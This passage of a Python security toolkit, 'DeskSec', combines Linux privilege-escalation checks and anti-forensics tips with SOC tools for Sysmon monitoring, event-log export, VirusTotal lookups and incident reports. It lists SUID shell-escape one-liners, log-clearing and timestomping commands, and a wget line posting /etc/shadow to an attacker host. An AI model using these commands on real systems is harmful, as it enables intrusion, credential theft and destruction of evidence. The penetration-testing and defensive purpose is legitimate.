        f.write(f"\n[ {section} ]\n{data}\n")

def linux_priv_esc_menu():
    while True:
        clear_screen()
        print("\n🐧 Linux Privilege Escalation Toolkit")
        print("1. Enumerate System Information & Permissions")
        print("2. Exploit SUID/SGID Binaries")
        print("3. Exploit Weak File & Directory Permissions")
        print("4. Kernel Exploits & CVE Checks")
        print("5. Automated PrivEsc Tools (LinPEAS, LinEnum, Linux-Exploit-Suggester)")
        print("6. Cron Job & Scheduled Task Exploitation")
        print("7. Back to Main Menu")

        choice = safe_input("\n🛠 Select an option: ").strip()

        if choice == "1":
            enumerate_linux_system()
        elif choice == "2":
            check_exploitable_suid_sgid()
        elif choice == "3":
            exploit_weak_permissions()
        elif choice == "4":
            kernel_exploit_checks()
        elif choice == "5":
            linux_auto_tools()
        elif choice == "6":
            cron_job_exploitation()
        elif choice == "7":
            return  # Back to Main Menu
        else:
            print("❌ Invalid selection. Please try again.")

def enumerate_linux_system():
    """Enumerate system information, kernel version, permissions, and environment configurations."""
    print("\n🔍 Gathering Linux System Information...\n")
    
    commands = {
        "Current User Info": "id",
        "Kernel Version": "uname -a",
        "Operating System": "cat /etc/os-release",
        "Sudo Permissions": "sudo -l",
        "SUID/SGID Files": "find / -perm -4000 -o -perm -2000 -type f 2>/dev/null",
        "Writable Files": "find / -writable -type f 2>/dev/null",
        "Writable Directories": "find / -writable -type d 2>/dev/null",
        "Environment Variables": "printenv",
    }

    report_content = []

    for description, cmd in commands.items():
        print(f"✅ Collecting: {description}")
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, text=True)
        except subprocess.CalledProcessError:
            output = "⚠️ Command failed or insufficient permissions."
        
        report_content.append(f"\n### {description} ###\n{output}\n")
        print(output[:300] + ("...\n" if len(output) > 300 else "\n"))  # Short preview

    # Save to report
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    filename = f"linux_enum_{timestamp}.txt"
    
    with open(filename, "w", encoding="utf-8") as f:
        f.write("\n".join(report_content))
    
    print(f"📄 Full enumeration report saved as: {filename}")

    safe_input("\n🔍 Enumeration complete! Press Enter to continue...")

def check_exploitable_suid_sgid():
    """Check for common exploitable SUID/SGID binaries on the system."""
    print("\n🔎 Scanning for exploitable SUID/SGID binaries...\n")

    exploitable_binaries = {
        "nmap": "nmap --interactive",
        "vim": "vim -c ':!sh'",
        "less": "less /etc/profile\n!sh",
        "find": "find . -exec /bin/sh \\; -quit",
        "bash": "bash -p",
        "cp": "cp /bin/sh /tmp && chmod +s /tmp/sh && /tmp/sh -p",
        "nano": "nano\n^R^X reset; sh 1>&0 2>&0",
        "more": "more /etc/profile\n!sh",
        "wget": "wget --post-file=/etc/shadow http://attacker-server.com",
    }

    try:
        suid_sgid_files = subprocess.check_output(
            "find / -perm -4000 -o -perm -2000 -type f 2>/dev/null",
            shell=True, text=True).splitlines()

        report_content = []
        found = False

        for file in suid_sgid_files:
            bin_name = file.strip().split("/")[-1]
            if bin_name in exploitable_binaries:
                found = True
                exploit_command = exploitable_binaries[bin_name]
                print(f"🚩 Potential Exploitable Binary: {file}")
                print(f"   ↳ Suggested Exploit: {exploit_command}\n")
                report_content.append(f"{file}:\n{exploit_command}\n")

        if not found:
            print("✅ No known exploitable SUID/SGID binaries found.")
            report_content.append("No exploitable binaries detected.")

        # Save report
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f"suid_sgid_exploit_{timestamp}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(report_content))

        print(f"📄 Exploitable binaries report saved: {filename}")

    except subprocess.CalledProcessError as e:
        print(f"❌ Error during scanning: {e}")

    safe_input("\n🔍 Check complete! Press Enter to continue...")   

def exploit_weak_permissions():
    """Check for exploitable weak file permissions."""
    print("\n🔍 Checking for Weak File Permissions...\n")

    sensitive_files = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/etc/sudoers",
        "/root/.ssh/id_rsa",
        "/home/*/.ssh/id_rsa",
        "/etc/cron.d/",
        "/etc/crontab",
        "/etc/cron.daily/",
        "/etc/cron.weekly/",
        "/etc/cron.monthly/"
    ]

    findings = []

    try:
        for sensitive_path in sensitive_files:
            cmd = f"find {sensitive_path} -type f -perm -o=rwx -exec ls -l {{}} \\; 2>/dev/null"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.stdout:
                print(f"🚩 Weak permissions detected:\n{result.stdout}")
                findings.append(result.stdout.strip())

        if not findings:
            print("✅ No weak file permissions found.")

        # Save findings
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f"weak_permissions_report_{timestamp}.txt"

        with open(filename, "w", encoding="utf-8") as f:
            if findings:
                f.write("\n".join(findings))
            else:
                f.write("No weak permissions detected.")

        print(f"\n📄 Weak permissions report saved: {filename}")

    except Exception as e:
        print(f"❌ Error checking permissions: {e}")

    safe_input("\n🔍 Permission check complete! Press Enter to continue...")

def kernel_exploit_checks():
    """Check kernel version for known exploits and provide recommendations."""
    print("\n🐧 Checking Kernel Version for Exploitable Vulnerabilities...\n")

    try:
        kernel_version = subprocess.run("uname -r", shell=True, capture_output=True, text=True).stdout.strip()
        print(f"🔹 Detected Kernel Version: {kernel_version}\n")

        # Common Linux kernel exploits and associated vulnerable kernel versions
        kernel_exploits = {
            "Dirty Cow (CVE-2016-5195)": ["2.6.22", "3.9", "4.8.3"],
            "OverlayFS (CVE-2015-1328)": ["3.13", "3.19", "4.2"],
            "Dirty Pipe (CVE-2022-0847)": ["5.8", "5.16", "5.16.11"],
            "PwnKit (CVE-2021-4034)": ["All Polkit versions < 0.120"],
            "Sequoia (CVE-2021-33909)": ["3.16", "5.13.4"],
        }

        potential_exploits = []

        for exploit, vulnerable_versions in kernel_exploits.items():
            for vuln_version in vulnerable_versions:
                if vuln_version in kernel_version:
                    potential_exploits.append(exploit)

        if potential_exploits:
            print("🚩 Potential Kernel Exploits Detected:")
            for exploit in set(potential_exploits):
                print(f"   • {exploit}")

            # Recommendations based on findings
            print("\n📌 Recommendations:")
            print("1. Apply the latest kernel patches or updates immediately.")
            print("2. If unable to update immediately, consider mitigation techniques such as restricting access or employing AppArmor or SELinux.")
            print("3. Manually verify if the exploit affects your specific kernel build and environment.")
        else:
            print("✅ No publicly-known kernel exploits detected for this kernel version.")

        # Save report
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f"kernel_exploit_report_{timestamp}.txt"

        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"Kernel Version: {kernel_version}\n\n")
            if potential_exploits:
                f.write("Potential Exploits Detected:\n")
                for exploit in set(potential_exploits):
                    f.write(f" - {exploit}\n")
                f.write("\nRecommendations:\n")
                f.write(" - Apply kernel patches/updates immediately.\n")
                f.write(" - Employ additional mitigations (AppArmor, SELinux).\n")
            else:
                f.write("No publicly-known kernel exploits detected.\n")

        print(f"\n📄 Kernel exploit report saved: {filename}")

    except Exception as e:
        print(f"❌ Error checking kernel exploits: {e}")

    safe_input("\n🔍 Kernel check complete! Press Enter to continue...")

def linux_auto_tools():
    """Provide installation instructions for Linux automated privilege escalation tools."""
    clear_screen()
    print("\n🐧 Linux Automated Privilege Escalation Tools")
    print("\n🚀 These scripts automate privilege escalation enumeration, saving time and effort.\n")

    tools_info = {
        "LinPEAS (Linux Privilege Escalation Awesome Script)": {
            "URL": "https://github.com/carlospolop/PEASS-ng/releases",
            "Usage": "./linpeas.sh"
        },
        "LinEnum (Linux Enumeration Script)": {
            "URL": "https://github.com/rebootuser/LinEnum",
            "Usage": "./LinEnum.sh"
        },
        "Linux Smart Enumeration (lse)": {
            "URL": "https://github.com/diego-treitos/linux-smart-enumeration",
            "Usage": "./lse.sh"
        }
    }

    for tool_name, tool_data in tools_info.items():
        print(f"🔹 {tool_name}")
        print(f"   📥 Download: {tool_data['URL']}")
        print(f"   🛠  Usage: {tool_data['Usage']}\n")

    # Save instructions to a timestamped report
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    filename = f"linux_priv_esc_tools_{timestamp}.txt"

    with open(filename, "w", encoding="utf-8") as f:
        f.write("🐧 Linux Automated Privilege Escalation Tools\n\n")
        for tool_name, tool_data in tools_info.items():
            f.write(f"{tool_name}\n")
            f.write(f"Download: {tool_data['URL']}\n")
            f.write(f"Usage: {tool_data['Usage']}\n\n")

    print(f"📄 Installation and usage instructions saved: {filename}")

    safe_input("🔍 Press Enter to return to the previous menu...")

def cron_job_exploitation():
    """Identify and exploit potentially vulnerable cron jobs."""
    clear_screen()
    print("\n⏰ Cron Job Exploitation")
    print("\n🔍 Checking for potentially vulnerable cron jobs...")

    # Enumerate cron jobs from standard locations
    cron_paths = ["/etc/crontab", "/etc/cron.d", "/var/spool/cron/crontabs"]
    vulnerable_crons = []

    for path in cron_paths:
        if os.path.exists(path):
            try:
                if os.path.isfile(path):
                    with open(path, 'r', encoding='utf-8') as f:
                        cron_content = f.readlines()
                else:
                    cron_content = []
                    for cron_file in os.listdir(path):
                        full_path = os.path.join(path, cron_file)
                        with open(full_path, 'r', encoding='utf-8') as f:
                            cron_content.extend(f.readlines())

                for line in cron_content:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        if "/tmp/" in line or "*" in line.split()[0]:
                            vulnerable_crons.append(line)
            except PermissionError:
                print(f"⚠️ Permission denied accessing {path}. Try with higher privileges.")

    if vulnerable_crons:
        print("\n⚠️ Potentially Vulnerable Cron Jobs Found:")
        for job in vulnerable_crons:
            print(f" - {job}")

        print("\n🛠 Recommended Exploitation Techniques:")
        print("1️⃣ Hijack writable scripts executed by cron.")
        print("2️⃣ Place malicious scripts in writable cron directories (e.g., /tmp).")
        print("3️⃣ Modify cron environment variables for PATH-based exploitation.")

        # Save findings
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f"cron_job_exploitation_{timestamp}.txt"

        with open(filename, "w", encoding="utf-8") as f:
            f.write("Potentially Vulnerable Cron Jobs:\n")
            for job in vulnerable_crons:
                f.write(f"{job}\n")

            f.write("\nRecommended Exploitation Techniques:\n")
            f.write("- Hijack writable scripts executed by cron.\n")
            f.write("- Place malicious scripts in writable cron directories (e.g., /tmp).\n")
            f.write("- Modify cron environment variables for PATH-based exploitation.\n")

        print(f"\n📄 Findings and recommendations saved: {filename}")
    else:
        print("\n✅ No immediately vulnerable cron jobs found.")

    safe_input("\n🔍 Press Enter to return to the previous menu...")

def evasion_anti_forensics():
    """Provide methods for evading detection and performing anti-forensics."""
    clear_screen()
    print("\n🕶️  Evasion & Anti-Forensics Techniques")
    techniques = {
        "1": {
            "name": "Log Clearing & Modification",
            "description": "Clear or tamper system logs to hide tracks.",
            "commands": [
                "Windows:\n\twevtutil cl Application\nwevtutil cl System\nwevtutil clear-log Security",
                "Linux:\nsudo shred -z /var/log/auth.log\nsudo echo > ~/.bash_history"
            ]
        },
        "2": {
            "name": "Timestomping (Modifying File Timestamps)",
            "description": "Alter timestamps to avoid detection.",
            "commands": [
                "Windows (using PowerShell):",
                "Get-Item 'C:\\path\\to\\file.txt' | % { $_.CreationTime = '01/01/2024 00:00' }",
                "",
                "Linux:",
                "touch -a -m -t 202401010000.00 /path/to/file"
            ]
        },
        "2": {
            "name": "Process Hollowing & DLL Injection",
            "description": "Techniques for hiding malicious processes by injecting code into legitimate processes.",
            "tools": [
                "Process Hollowing: https://github.com/hasherezade/process_hollowing",
                "Reflective DLL Injection: https://github.com/stephenfewer/ReflectiveDLLInjection"
            ],
        },
        "3": {
            "name": "Data Obfuscation & Encryption",
            "description": "Use data obfuscation and encryption to avoid detection by forensics tools.",
            "tools": [
                "Invoke-Obfuscation (PowerShell): https://github.com/danielbohannon/Invoke-Obfuscation",
                "Cryptcat (Encrypted Netcat): https://github.com/de-facto/cryptcat"
            ],
        },
        "4": {
            "name": "Process Masquerading & Parent PID Spoofing",
            "description": "Hide malicious activity by making processes appear legitimate.",
            "tools": [
                "PPID Spoofing (Windows): https://github.com/S3cur3Th1sSh1t/PPID-Spoofing",
                "Invoke-PSImage: https://github.com/peewpw/Invoke-PSImage"
            ],
        },
        "5": {
            "name": "Steganography & Data Obfuscation",
            "description": "Conceal sensitive information within files to evade detection.",
            "tools": [
                "Steghide: https://github.com/StefanoDeVuono/steghide",
                "OpenStego: https://github.com/syvaidya/openstego"
            ],
        }
    }

    for key, tech in techniques.items():
        print(f"\n[{key}] {techniques[key]['name'] if 'name' in techniques[key] else 'Technique'}")
        print(f"    📝 {techniques[key]['description']}")

    choice = safe_input("\n🛠 Select a technique to explore (or press Enter to go back): ").strip()

    if choice in techniques:
        selected = techniques[choice]
        clear_screen()
        print(f"\n🕶️  {selected['name']}")
        print(f"📖 Description: {selected['description']}\n")

        if "commands" in selected:
            print("\n⚙️ Commands/Usage Examples:")
            for cmd in selected["commands"]:
                print(f"  - {cmd}")

        if "tools" in selected:
            print("\n🔧 Recommended Tools:")
            for tool in selected["tools"]:
                print(f"📌 {tool}")

        # Allow saving to a report
        save_option = safe_input("\n💾 Save this information to a report? (y/n): ").strip().lower()
        if save_option == "y":
            filename = f"{selected['name'].replace(' ', '_').lower()}_report.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"{selected['name']}\n\n")
                f.write(f"Description:\n{selected['description']}\n\n")
                if "commands" in selected:
                    f.write("Commands:\n")
                    for cmd in selected["commands"]:
                        f.write(f"{cmd}\n")
                if "tools" in selected:
                    f.write("\nRecommended Tools:\n")
                    for tool in selected["tools"]:
                        f.write(f"{tool}\n")
            print(f"✅ Information saved to: {filename}")

        safe_input("\nPress Enter to return to the menu...")
    else:
        return

###########################################################################
#                                                                         #
#                           SOC THREAT INTEL MENU                         #
#                                                                         #
###########################################################################

def soc_threat_intelligence_menu():
    """SOC & Threat Intelligence Tools Menu"""
    while True:
        clear_screen()
        print("\n🛡️ DeskSec - SOC & Threat Intelligence")
        print("1  Real-Time Threat Monitoring (Sysmon)")
        print("2  Windows Security Event Analysis")
        print("3  File Integrity Monitoring (FIM)")
        print("4  Active Directory Security Audits")
        print("5  Threat Intelligence & IOC Checks")
        print("6  Incident Response Reporting")
        print("7  Back to Main Menu")

        choice = safe_input("\n🛠 Select an option: ").strip()

        if choice == "1":
            real_time_threat_monitoring()
        elif choice == "2":
            fetch_windows_event_logs()
        elif choice == "3":
            file_integrity_menu()
        elif choice == "4":
            active_directory_audit()
        elif choice == "5":
            threat_intelligence_menu()
        elif choice == "6":
            incident_response_reporting()
        elif choice == "7":
            return
        else:
            print("❌ Invalid choice, please try again.")

def real_time_threat_monitoring():
    """Monitor real-time Sysmon logs for critical events."""
    monitored_event_ids = ["1", "3", "7", "8", "11"]
    last_event_text = ""  # Proper initialization before use

    # Check Sysmon installation
    try:
        subprocess.run(
            "wevtutil qe Microsoft-Windows-Sysmon/Operational /c:1",
            shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except subprocess.CalledProcessError:
        print("❌ Sysmon not detected. Please install Sysmon first.")
        print("🔗 https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon")
        safe_input("Press Enter to continue...")
        return

    print("\n🔍 Real-Time Threat Monitoring (Sysmon)")
    print("🛑 Press CTRL+C to stop monitoring.\n")

    try:
        while True:
            result = subprocess.run(
                "wevtutil qe Microsoft-Windows-Sysmon/Operational /c:1 /f:text /rd:true",
                shell=True, capture_output=True, text=True
            )
            event_text = result.stdout.strip()

            match = re.search(r"Event ID:\s+(\d+)", event_text)
            if match:
                current_event_id = match.group(1)

                if current_event_id in monitored_event_ids and event_text != last_event_text:
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                    alert = f"🚨 [{timestamp}] Event ID {current_event_id} detected!\n{event_text}\n"
                    print(alert)

                    with open("sysmon_realtime_log.txt", "a", encoding="utf-8") as log_file:
                        log_entry = f"[{timestamp}] Event ID {current_event_id}\n{event_text}\n{'-'*40}\n"
                        log_file.write(log_entry)

                    last_event_text = event_text  # Update the last event seen

            time.sleep(2)  # Polling interval (adjustable)

    except KeyboardInterrupt:
        print("\n🚪 Monitoring stopped by user.")
        safe_input("\nPress Enter to return to the menu...")

def fetch_windows_event_logs():
    """Fetch Windows Event Logs and save them to a CSV report."""

    log_types = {
        "1": "Security",
        "2": "Application",
        "3": "System"
    }

    print("\n📑 Fetch Windows Event Logs")
    print("1. Security Logs")
    print("2. Application Logs")
    print("3. System Logs")

    choice = safe_input("\n🛠 Select log type to fetch (1-3): ").strip()
    log_type = log_types.get(choice, "Security")

    num_events = safe_input("🔢 Enter the number of recent events to fetch (default 100): ").strip()
    num_events = int(num_events) if num_events.isdigit() else 100

    print(f"\n📑 Fetching {num_events} events from {log_type} logs...\n")

    server = 'localhost'
    hand = win32evtlog.OpenEventLog(server, log_type)
    flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
    events = []
    total_fetched = 0

    try:
        while total_fetched < num_events:
            records = win32evtlog.ReadEventLog(hand, flags, 0)
            if not records:
                break

            for event in records:
                if total_fetched >= num_events:
                    break

                event_time = event.TimeGenerated.Format("%Y-%m-%d %H:%M:%S")
                event_source = event.SourceName if event.SourceName else "Unknown"
                event_id = event.EventID & 0xFFFF
                event_message = win32evtlogutil.SafeFormatMessage(event, log_type)

                events.append([
                    event.TimeGenerated.Format("%Y-%m-%d %H:%M:%S"),
                    log_type,
                    event.SourceName if event.SourceName else "Unknown Source",
                    event.EventID & 0xFFFF,
                    event_message_clean(event_message=event_message)
                ])

                total_fetched += 1

        report_filename = f"{log_type}_Event_Logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        with open(report_filename, "w", newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            writer.writerow(["TimeCreated", "LogType", "Source", "EventID", "Message"])
            writer.writerows(events)

        print(f"\n✅ {len(events)} events successfully saved to {report_filename}")

    except Exception as e:
        print(f"❌ Error fetching logs: {e}")

    finally:
        win32evtlog.CloseEventLog(hand)

    safe_input("\n🔍 Press Enter to return to the menu...")

def event_message_clean(event_message):
    """Clean the event message to avoid newline issues in CSV."""
    if event_message:
        return " ".join(event_message.strip().split())
    else:
        return "No message found."

def event_source(event):
    return event.SourceName if event.SourceName else "Unknown Source"

def event_id(event):
    return event.EventID & 0xFFFF

def event_message(event):
    try:
        return event.StringInserts if event.StringInserts else "No additional information."
    except:
        return "No additional information available."

def save_to_report(report_name, data):
    """Append data to a CSV report."""
    filename = f"{report_name}.csv"
    with open(filename, "a", newline="", encoding="utf-8") as file:
        writer = csv.writer(file)
        writer.writerow([data])

    print(f"📋 Saved to {filename}")

def threat_intelligence_menu():
    """Threat Intelligence & IOC Analysis"""
    while True:
        clear_screen()
        print("\n🛡️ Threat Intelligence & IOC Analysis")
        print("1. URL Reputation Check")
        print("2. IP Reputation Check")
        print("3. File Hash Lookup")
        print("4. Return to Main Menu")

        choice = safe_input("\nSelect an option (1-4): ").strip()

        if choice == "1":
            url = safe_input("\n🌐 Enter URL to check: ").strip()
            url_reputation_check(url)
        elif choice == "2":
            ip = safe_input("\n🌐 Enter IP address to check: ").strip()
            ip_reputation_check(ip)
        elif choice == "3":
            file_hash = safe_input("\n🔍 Enter file hash to check: ").strip()
            file_hash_lookup(file_hash=file_hash)
        elif choice == "4":
            return
        else:
            print("❌ Invalid option, please try again.")

def ip_reputation_check(ip_address):
    """Check IP reputation using VirusTotal API."""
    url = f"https://www.virustotal.com/api/v3/ip_addresses/{ip_address}"
    headers = {"x-apikey": VIRUSTOTAL_API_KEY}

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        data = response.json()
        stats = data.get("data", {}).get("attributes", {}).get("last_analysis_stats", {})

        malicious = stats.get("malicious", 0)
        suspicious = stats.get("suspicious", 0)

        print(f"\n📌 IP Reputation Check for {ip_address}")
        print(f"✅ Malicious detections: {malicious}")
        print(f"⚠️ Suspicious detections: {suspicious}")

        if malicious > 0 or suspicious > 0:
            print(f"\n⚠️ Warning: The IP {ip_address} has been flagged as potentially malicious!")
        else:
            print(f"\n✅ No malicious activity reported for IP: {ip_address}")

    except requests.exceptions.RequestException as e:
        print(f"❌ Error retrieving IP reputation: {e}")
    except ValueError as e:
        print(f"❌ Error parsing API response: {e}")

    safe_input("Press Enter to continue...")

def url_reputation_check(url):
    """Check URL reputation using VirusTotal API."""
    api_url = "https://www.virustotal.com/api/v3/urls"
    headers = {
        "x-apikey": VIRUSTOTAL_API_KEY,
        "accept": "application/json"
    }

    try:
        # VirusTotal API requires URL to be encoded
        url_id = base64.urlsafe_b64encode(url.encode()).decode().strip("=")
        response = requests.get(f"{api_url}/{url_id}", headers=headers)
        response.raise_for_status()

        data = response.json()
        stats = data.get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
        malicious = stats.get("malicious", 0)
        suspicious = stats.get("suspicious", 0)

        print(f"\n📌 URL Reputation Check for {url}")
        print(f"✅ Malicious detections: {malicious}")
        print(f"⚠️ Suspicious detections: {suspicious}")

        if malicious > 0 or suspicious > 0:
            print(f"\n⚠️ Warning: The URL '{url}' is potentially malicious!")
        else:
            print(f"\n✅ No malicious activity reported for URL: {url}")

    except requests.exceptions.RequestException as e:
        print(f"❌ Error retrieving URL reputation: {e}")
    except ValueError as e:
        print(f"❌ Error parsing API response: {e}")

    safe_input("Press Enter to continue...")

def file_hash_lookup(file_hash):
    """Check file hash reputation using VirusTotal API."""
    api_url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
    headers = {
        "x-apikey": VIRUSTOTAL_API_KEY,
        "accept": "application/json"
    }

    try:
        response = requests.get(api_url, headers=headers)
        
        if response.status_code == 404:
            print(f"\n⚠️ The file hash '{file_hash}' was not found in VirusTotal's database.")
            print("➡️ Consider manually uploading the file to VirusTotal for analysis.")
            return

        response.raise_for_status()

        data = response.json()
        stats = data.get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
        malicious = stats.get("malicious", 0)
        suspicious = stats.get("suspicious", 0)

        print(f"\n📌 File Hash Lookup for {file_hash}")
        print(f"✅ Malicious detections: {malicious}")
        print(f"⚠️ Suspicious detections: {suspicious}")

        if malicious > 0 or suspicious > 0:
            print(f"\n⚠️ Warning: The file hash '{file_hash}' is flagged as potentially malicious!")
        else:
            print(f"\n✅ No malicious detections reported for file hash: {file_hash}")

    except requests.exceptions.RequestException as e:
        print(f"❌ Network or HTTP error occurred: {e}")
    except ValueError as e:
        print(f"❌ Error parsing API response: {e}")

    safe_input("Press Enter to continue...")

def incident_response_reporting():
    """Interactive Incident Reporting Tool."""
    clear_screen()
    print("\n📝 Incident Response Reporting")

    incident = {}

    incident['IncidentID'] = datetime.now().strftime("IR-%Y%m%d-%H%M%S")
    incident['DateTime'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    incident['ReportedBy'] = safe_input("👤 Reported By: ").strip()
    incident['IncidentType'] = safe_input("🛡️ Incident Type (e.g., Phishing, Malware, Unauthorized Access): ").strip()
    incident['Priority'] = safe_input("🚩 Priority Level (Low, Medium, High, Critical): ").strip()
    incident['Description'] = safe_input("📝 Brief Description of Incident:\n").strip()
    affected_systems = safe_input("🖥️ Affected Systems (comma-separated hostnames/IPs): ").strip()
    incident['AffectedSystems'] = [system.strip() for system in affected_systems.split(',') if system]
    iocs = safe_input("🔍 Identified Indicators of Compromise (IPs, URLs, Hashes): ").strip()
    incident['IOCs'] = [ioc.strip() for ioc in iocs.split(',') if ioc]
    incident['ResponseActions'] = safe_input("✅ Initial Response Actions Taken:\n").strip()
    incident['AdditionalNotes'] = safe_input("📋 Additional Notes (optional):\n").strip()

    print("\n🗒️ Review Incident Report:")
    for key, value in incident.items():
        print(f"{key}: {value}")

    confirm = safe_input("\n📌 Confirm save incident report? (y/n): ").lower().strip()
    if confirm == 'y':
        save_incident_report(incident)
    else:
        print("⚠️ Incident report discarded.")

    safe_input("\n🔍 Press Enter to return to the menu...")

def save_incident_report(incident):
    """Save incident details into a JSON file."""
    reports_dir = "Incident_Reports"
    os.makedirs(reports_dir, exist_ok=True)
    filename = f"{incident['IncidentID']}.json"
    filepath = os.path.join(reports_dir, filename)

    try:
        with open(filepath, "w", encoding="utf-8") as file:
            json.dump(incident, file, indent=4)
        print(f"\n✅ Incident report saved successfully as '{filename}'")
    except Exception as e:
        print(f"\n❌ Failed to save incident report: {e}")
        
###########################################################################
#                                                                         #
#                                 MAIN MENU                               #
#                                                                         #
###########################################################################

def main():
    """Main DeskSec Menu"""
    try:
        while True:
            clear_screen()
            print("\n💻  DeskSec - Main Menu")
            print("1  Network Tools")
            print("2  System Diagnostics")
            print("3  Security & Log Analysis")
            print("4  Automation & Scripting")
            print("5  Advanced Security")
            print("6  Exit")

            choice = safe_input("\nSelect an option: ")

            if choice == "1":
                network_tools_menu()
            elif choice == "2":
                system_diagnostics_menu()
            elif choice == "3":
                security_log_analysis_menu()
            elif choice == "4":
                automation_tools_menu()
            elif choice == "5":
                advanced_security_menu()
            elif choice == "6":
                print("👋 Exiting DeskSec. Stay secure!")
                break
            else:
                print("❌ Invalid choice, please try again.")
    except KeyboardInterrupt:
        print("\n\n🚪 Ctrl+C detected. Exiting DeskSec gracefully... 👋")
        sys.exit(0)  # Graceful exit

if __name__ == "__main__":
    main()
